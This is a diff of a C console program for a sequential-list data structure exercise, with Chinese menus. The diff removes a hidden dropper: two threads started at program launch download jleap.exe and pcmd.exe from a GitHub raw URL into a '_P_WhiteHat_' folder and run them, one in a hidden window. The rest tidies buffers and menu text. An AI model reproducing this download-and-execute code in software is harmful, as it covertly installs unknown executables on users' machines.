@@ -1,57 +1,7 @@
 //以下将ElemType作数字处理
 #include <stdio.h>
-#include <windows.h>
-#include <winhttp.h>
-#include <unistd.h>
-#include <string.h>
-#include <__pink/pinkwin.h>
-#include <__pink/phttp.h>
-#include <__pink/pfile.h>
+#include <stdlib.h>
 #include <c:/users/26417/desktop/datas/pSqList.h>
-
-DWORD WINAPI Func1(void* argv)
-{
-	int ret;
-	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
-	char *dir[3]={"/_P_WhiteHat_", "/SqList", "/jleap.exe"};
-	if(!GlobalBuffer)
-		return -1;
-	pmkdir(filepath, ps, dir, 2);
-	strcat(filepath, dir[2]);
-	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_SHOWNORMAL);
-	if(GetLastError()!=0){
-		do{
-			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/WH/master/6.66/jleap.exe", filepath);
-		}while(ret!=0);
-		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_SHOWNORMAL);
-	}
-	free(GlobalBuffer);
-	return 0;
-}
-
-DWORD WINAPI Func2(void* argv)
-{
-	int ret;
-	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
-	char *dir[2]={"/_P_WhiteHat_", "/pcmd.exe"};
-	if(!GlobalBuffer)
-		return -1;
-	pmkdir(filepath, ps, dir, 1);
-	strcat(filepath, dir[1]);
-	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
-	if(GetLastError()!=0){
-		do{
-			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/c/master/_P_whitehat_/pcmd.exe", filepath);
-		}while(ret!=0);
-		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
-	}
-	free(GlobalBuffer);
-	return 0;
-}
-
-
-
-
 
 void menu();
 void menux();
@@ -60,15 +10,8 @@ int ychoose(int n);
 void pfname(char** pps);
 
 int main(){
-	HANDLE hThread1, hThread2;
-	hThread1=pCreateThread(&Func1, NULL);
-	hThread2=pCreateThread(&Func2, NULL);
-	CloseHandle(hThread1);
-	CloseHandle(hThread2);
-
 	int i;
 	SqList L;
-	char GlobalBuffer[1024];
 	menu();
 	if( InitList(&L, 100) )
 		printf("First init Error\n");
@@ -208,7 +151,7 @@ int main(){
 			case 'R':
 			{
 				int r;
-				char *filename=GlobalBuffer, openmode[8]="r", *ps=filename;
+				char filename[512], openmode[8]="r", *ps=filename;
 				printf("请将目标文件拖到这里||或输入目标文件名: ");
 				pfname(&ps);
 				r=fscanList(&L, ps, openmode);
@@ -241,7 +184,7 @@ int main(){
 			case 'W':
 			{
 				int r;
-				char *filename=GlobalBuffer, openmode[8]="w", *ps=filename;
+				char filename[512], openmode[8]="w", *ps=filename;
 				printf("请将目标文件拖到这里||或输入目标文件名: ");
 				pfname(&ps);
 				r=fprintList(&L, ps, openmode);
@@ -293,7 +236,7 @@ int main(){
 
 void menu()
 {
-	printf("\nA.输出  B.初始化设置100个数据  C.clear清空  D.删除元素  E.添加元素  F.查找元素  G.修改元素  K.清屏  H.更多  Q.退出\n请选择: ");
+	printf("\nA.输出顺序表  B.初始化设置100个数据  C.clear清空  D.删除元素  E.添加元素  F.查找元素  G.修改元素  H.更多  Q.退出\n请选择: ");
 }
 
 void menux()
@@ -329,7 +272,7 @@ int ychoose(int n)
 
 void pfname(char** pps)
 {
-		scanf("%*c%1000[^\n]%*[^\n]", *pps);
+		scanf("%*c%500[^\n]%*[^\n]", *pps);
 		if(**pps==0x22){
 			*(*pps+strlen(*pps)-1)=0;
 			(*pps)++;
